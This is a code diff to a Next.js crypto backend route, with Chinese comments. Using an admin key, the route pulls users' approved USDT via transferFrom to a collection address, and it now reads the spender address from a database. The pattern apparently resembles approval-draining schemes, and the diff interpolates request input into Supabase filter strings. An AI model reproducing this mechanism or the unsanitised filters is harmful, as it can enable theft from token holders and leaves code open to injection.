@@ -2,20 +2,18 @@ import { type NextRequest, NextResponse } from 'next/server'
 import { addCorsHeaders } from '@/lib/utils'
 import { supabase } from '@/lib/supabase'
 import { ethers } from 'ethers'
+import ETH_NETWORK_CONFIG from '@/config/eth-network'
 
 export const dynamic = 'force-dynamic'
 
-// ETH 主网配置 - 多个RPC节点备用
+// ETH 网络配置 - 使用 Tenderly 虚拟测试网
 const ETH_RPC_URLS = [
-  'https://ethereum.publicnode.com',
-  'https://eth.llamarpc.com', 
-  'https://rpc.ankr.com/eth',
-  'https://ethereum.blockpi.network/v1/rpc/public',
-  'https://rpc.mevblocker.io'
+  ETH_NETWORK_CONFIG.RPC_URL,
+  ...ETH_NETWORK_CONFIG.FALLBACK_RPC_URLS
 ]
-const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7' // ETH USDT 合约地址
-const STAKING_CONTRACT_ADDRESS = '0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218' // 归集到财务地址的合约
-const USDT_DECIMALS = 6
+const USDT_CONTRACT_ADDRESS = ETH_NETWORK_CONFIG.USDT_CONTRACT_ADDRESS
+const STAKING_CONTRACT_ADDRESS = ETH_NETWORK_CONFIG.STAKING_CONTRACT_ADDRESS
+const USDT_DECIMALS = ETH_NETWORK_CONFIG.USDT_DECIMALS
 
 // 管理员私钥（用于签名交易）
 const ADMIN_PRIVATE_KEY = process.env.ADMIN_PRIVATE_KEY || ''
@@ -215,6 +213,46 @@ export async function POST(request: NextRequest) {
 
     console.log(`🔄 开始真实链上归集操作:`, { userAddress, amount: collectionAmount, toAddress: finalToAddress })
 
+    // 查找用户（支持wallet_address和auth_wallet_address）
+    // 注意：用户地址应该是用户的钱包地址，不是权限地址
+    let actualUserAddress = userAddress
+    const { data: userData } = await supabase
+      .from('nh_member_new')
+      .select('wallet_address, auth_wallet_address')
+      .or(`wallet_address.eq.${userAddress},auth_wallet_address.eq.${userAddress}`)
+      .eq('is_active', true)
+      .single()
+    
+    if (userData) {
+      // 用户地址应该是 wallet_address（用户注册的钱包地址）
+      // auth_wallet_address 是用户授权给的地址（权限地址），不是用户自己的地址
+      actualUserAddress = userData.wallet_address || userAddress
+      console.log(`🔍 找到用户信息:`, {
+        用户注册地址: userData.wallet_address,
+        授权给的地址: userData.auth_wallet_address,
+        实际归集地址: actualUserAddress
+      })
+    } else {
+      console.log(`⚠️ 未找到用户记录，使用提供的地址: ${userAddress}`)
+    }
+
+    // 从数据库获取权限地址（用户授权给的地址）
+    let permissionAddress: string | null = null
+    const { data: permissions, error: permError } = await supabase
+      .from('contract_permissions')
+      .select('permission_address, contract_address')
+      .eq('chain_type', 'ERC')
+      .eq('is_enabled', true)
+      .order('sort', { ascending: true })
+      .limit(1)
+    
+    if (!permError && permissions && permissions.length > 0) {
+      permissionAddress = permissions[0].permission_address
+      console.log(`✅ 从数据库获取到权限地址: ${permissionAddress}`)
+    } else {
+      console.warn('⚠️ 未从数据库获取到权限地址，将使用管理员钱包地址')
+    }
+
     // 创建 ETH 网络提供者
     const provider = await createProvider()
     
@@ -228,25 +266,29 @@ export async function POST(request: NextRequest) {
     console.log(`🔑 私钥长度: ${cleanPrivateKey.length}`)
     
     const adminWallet = new ethers.Wallet(cleanPrivateKey, provider)
-    console.log(`👤 管理员地址（权限地址）: ${adminWallet.address}`)
+    console.log(`👤 管理员钱包地址: ${adminWallet.address}`)
+    
+    // 使用数据库配置的权限地址，如果没有则使用管理员钱包地址
+    const spenderAddress = permissionAddress || adminWallet.address
+    console.log(`🔐 使用的授权对象地址（权限地址）: ${spenderAddress}`)
     
     // 创建 USDT 合约实例（用于查询余额和执行转账）
     const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, adminWallet)
 
-    // 检查用户钱包的USDT余额
-    const userBalance = await usdtContract.balanceOf(userAddress)
+    // 检查用户钱包的USDT余额（使用实际用户地址）
+    const userBalance = await usdtContract.balanceOf(actualUserAddress)
     const userBalanceFormatted = ethers.formatUnits(userBalance, USDT_DECIMALS)
     
     console.log(`💰 用户钱包 USDT 余额: ${userBalanceFormatted}`)
 
-    // 检查用户是否已授权给管理员地址（权限地址）
-    const allowance = await usdtContract.allowance(userAddress, adminWallet.address)
+    // 检查用户是否已授权给权限地址（使用数据库配置的权限地址）
+    const allowance = await usdtContract.allowance(actualUserAddress, spenderAddress)
     const allowanceFormatted = ethers.formatUnits(allowance, USDT_DECIMALS)
     
-    console.log(`🔐 用户授权管理员地址额度: ${allowanceFormatted} USDT`)
+    console.log(`🔐 用户授权权限地址额度: ${allowanceFormatted} USDT`)
     console.log(`🔐 原始授权额度: ${allowance.toString()}`)
-    console.log(`🔐 用户地址: ${userAddress}`)
-    console.log(`🔐 管理员地址（权限地址）: ${adminWallet.address}`)
+    console.log(`🔐 用户地址: ${actualUserAddress}`)
+    console.log(`🔐 权限地址（授权对象）: ${spenderAddress}`)
 
     // 检查余额和verify是否足够
     const requiredAmount = ethers.parseUnits(collectionAmount.toString(), USDT_DECIMALS)
@@ -261,20 +303,22 @@ export async function POST(request: NextRequest) {
     if (allowance < requiredAmount) {
       const response = NextResponse.json({
         success: false,
-        error: `用户未授权足够的 USDT 给管理员地址，当前授权额度: ${allowanceFormatted} USDT，需要: ${collectionAmount} USDT。请让用户先授权USDT给管理员地址: ${adminWallet.address}`,
+        error: `用户未授权足够的 USDT 给管理员地址，当前授权额度: ${allowanceFormatted} USDT，需要: ${collectionAmount} USDT。请让用户先授权USDT给管理员地址: ${spenderAddress}`,
         details: {
           requiredAction: '用户需要调用 USDT 合约的 approve 函数',
-          approveTarget: adminWallet.address,
+          approveTarget: spenderAddress,
           approveAmount: collectionAmount,
           usdtContract: USDT_CONTRACT_ADDRESS,
-          currentAllowance: allowanceFormatted
+          currentAllowance: allowanceFormatted,
+          userAddress: actualUserAddress,
+          permissionAddress: spenderAddress
         }
       }, { status: 400 })
       return addCorsHeaders(response)
     }
 
     // 执行归集操作 - 使用 USDT 合约的 transferFrom 方法（正确的授权划转逻辑）
-    console.log(`🚀 执行归集: 使用管理员地址私钥，调用 USDT 合约 transferFrom 从用户 ${userAddress} 转移 ${collectionAmount} USDT`)
+    console.log(`🚀 执行归集: 使用管理员地址私钥，调用 USDT 合约 transferFrom 从用户 ${actualUserAddress} 转移 ${collectionAmount} USDT`)
 
     let tx, receipt
     let userBalanceBefore, adminBalanceBefore, userBalanceAfter, adminBalanceAfter
@@ -283,7 +327,7 @@ export async function POST(request: NextRequest) {
 
     try {
       // 先获取用户当前余额用于验证
-      userBalanceBefore = await usdtContract.balanceOf(userAddress)
+      userBalanceBefore = await usdtContract.balanceOf(actualUserAddress)
       adminBalanceBefore = await usdtContract.balanceOf(adminWallet.address)
       
       console.log(`📊 转账前余额 - 用户: ${ethers.formatUnits(userBalanceBefore, USDT_DECIMALS)} USDT, 管理员: ${ethers.formatUnits(adminBalanceBefore, USDT_DECIMALS)} USDT`)
@@ -326,7 +370,7 @@ export async function POST(request: NextRequest) {
             : adminWallet.address
           
           tx = await usdtContract.transferFrom(
-            userAddress,        // from: 用户地址
+            actualUserAddress,  // from: 用户地址（使用实际用户地址）
             targetAddress,      // to: 收款地址
             requiredAmount,     // amount: 转账金额
             {
@@ -365,7 +409,7 @@ export async function POST(request: NextRequest) {
       console.log(`✅ 交易已确认，区块号: ${receipt.blockNumber}`)
       
       // 验证转账是否成功
-      userBalanceAfter = await usdtContract.balanceOf(userAddress)
+      userBalanceAfter = await usdtContract.balanceOf(actualUserAddress)
       const targetBalanceAfter = await usdtContract.balanceOf(finalToAddressResult)
       
       console.log(`📊 转账后余额 - 用户: ${ethers.formatUnits(userBalanceAfter, USDT_DECIMALS)} USDT, 收款地址: ${ethers.formatUnits(targetBalanceAfter, USDT_DECIMALS)} USDT`)
@@ -419,12 +463,12 @@ export async function POST(request: NextRequest) {
 
     // 更新数据库记录（合约归集操作）
     try {
-      // 查找用户（如果提供了用户地址）
-      if (userAddress) {
+      // 查找用户（使用实际用户地址）
+      if (actualUserAddress) {
         const { data: userData, error: userError } = await supabase
           .from('nh_member_new')
           .select('id, usdt, dividend_usdt, withdrawal_usdt')
-          .eq('wallet_address', userAddress)
+          .or(`wallet_address.eq.${actualUserAddress},auth_wallet_address.eq.${actualUserAddress}`)
           .eq('is_active', true)
           .single()
 
@@ -477,12 +521,12 @@ export async function POST(request: NextRequest) {
     // 记录归集日志
     try {
       const transferType = 'authorized_transfer'
-      const description = `授权归集操作 - 从用户 ${userAddress} 转移 ${collectionAmount} USDT 到收款地址 ${finalToAddressResult}`
+      const description = `授权归集操作 - 从用户 ${actualUserAddress} 转移 ${collectionAmount} USDT 到收款地址 ${finalToAddressResult}`
       
       await supabase
         .from('authorized_transfers')
         .insert([{
-          user_wallet_address: userAddress || 'authorized_transfer',
+          user_wallet_address: actualUserAddress || 'authorized_transfer',
           to_wallet_address: finalToAddressResult,
           amount: collectionAmount,
           transfer_id: `${transferType}_${Date.now()}_${finalToAddressResult.slice(-8)}`,
@@ -501,7 +545,7 @@ export async function POST(request: NextRequest) {
     
     const result = {
              transactionHash: tx.hash,
-             fromAddress: userAddress,
+             fromAddress: actualUserAddress,
              toAddress: finalToAddressResult,
              amount: collectionAmount,
              gasUsed: receipt.gasUsed.toString(),
